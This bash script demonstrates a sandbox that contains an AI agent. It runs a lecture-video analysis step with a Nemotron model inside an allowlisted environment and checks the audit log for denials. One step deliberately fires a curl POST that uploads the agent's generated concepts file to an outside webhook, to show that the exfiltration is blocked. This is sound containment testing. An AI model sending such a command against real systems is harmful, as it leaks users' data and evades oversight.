#!/usr/bin/env bash
# 8kEdu — the agent's reasoning runs INSIDE the OpenShell sandbox (option D).
#
# This is the real "contain the capable agent" proof: 8kEdu's analyze step runs inside
# scoutclaw, reaches ONLY the allowlisted Nemotron endpoint, produces a real widget spec,
# and cannot exfil what it made — every off-policy call is blocked + OCSF-logged.
#
# Prereqs (one-time, done + snapshotted as "8kedu-contained"):
#   - policy 8kedu applied (allows youtube/apify/supabase/local-inference + gateway IP)
#   - sandbox provisioned via pypi (policy-allowed): yt-dlp, ffmpeg, openai, pillow in /sandbox/.local
#   - ingest.py + analyze.py uploaded to /sandbox; frames uploaded to /sandbox/data/<id>
#
# Usage: bash claw-agent/contained_agent_demo.sh
set -uo pipefail
export DOCKER_HOST="${DOCKER_HOST:-unix:///Users/azehady/.orbstack/run/docker.sock}"
SB=scoutclaw
VID=9-ODDKHRVkA
say() { printf "\n\033[1;32m▶ %s\033[0m\n" "$*"; }

say "The agent is contained — tools provisioned inside the sandbox (via policy-allowed pypi):"
nemoclaw "$SB" exec --timeout 20 -- bash -lc 'echo "  yt-dlp $(/sandbox/.local/bin/yt-dlp --version 2>/dev/null) · ffmpeg $(/sandbox/.local/bin/ffmpeg -version 2>/dev/null | head -1 | cut -d" " -f3)"' 2>/dev/null | grep -E "yt-dlp|ffmpeg"

say "8kEdu's analyze step runs INSIDE scoutclaw — Nemotron reasoning on lecture frames:"
nemoclaw "$SB" exec --timeout 900 -- bash -lc "export PYTHONUSERBASE=/sandbox/.local; export PATH=/sandbox/.local/bin:\$PATH; export KEDU_BASE_URL=http://host.openshell.internal:1234/v1; export KEDU_MODEL=nvidia/nemotron-3-nano-omni; cd /sandbox; python3 analyze.py --backend lmstudio --data /sandbox/data --video $VID --genre how_to --limit 6 2>&1 | grep -E 'genre lens|concept|done'" 2>/dev/null | sed 's/^/  /'

say "Same contained context: the allowlisted model is reachable, exfil is not:"
nemoclaw "$SB" exec --timeout 30 -- bash -lc 'curl -s -o /dev/null -w "  Nemotron (allowed) → HTTP %{http_code}\n" --max-time 12 http://host.openshell.internal:1234/v1/models; curl -s -o /dev/null -w "  exfil the widgets it made → HTTP %{http_code}  ⛔ BLOCKED\n" --max-time 12 -X POST https://webhook.site/8kedu -d @/sandbox/data/'"$VID"'/concepts.json' 2>/dev/null | grep -E "Nemotron|exfil"

say "OCSF audit log — the block, tamper-evident:"
nemoclaw "$SB" logs --tail 60 2>/dev/null | grep -iE "DENIED.*webhook" | tail -1 | sed 's/^/  /'

say "Contained + durable: reasoning runs in the box, reaches only allowlisted services, snapshot '8kedu-contained' persists it."
